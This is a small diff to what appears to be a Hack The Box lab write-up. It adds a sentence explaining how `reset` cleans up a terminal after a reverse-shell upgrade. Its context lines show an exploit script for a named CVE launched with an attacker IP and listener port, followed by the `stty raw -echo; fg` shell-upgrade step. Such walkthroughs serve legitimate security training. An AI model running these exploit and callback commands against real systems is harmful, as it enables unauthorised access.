@@ -1489,6 +1489,8 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 
 Once the shell is back, type `reset` and hit enter. If it asks for a terminal type, type `xterm-256color`.
 
+Because you just messed with the terminal settings, the screen often gets wonky. `reset` re-initializes the terminal window so it looks clean.
+
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
 └─$ stty raw -echo; fg
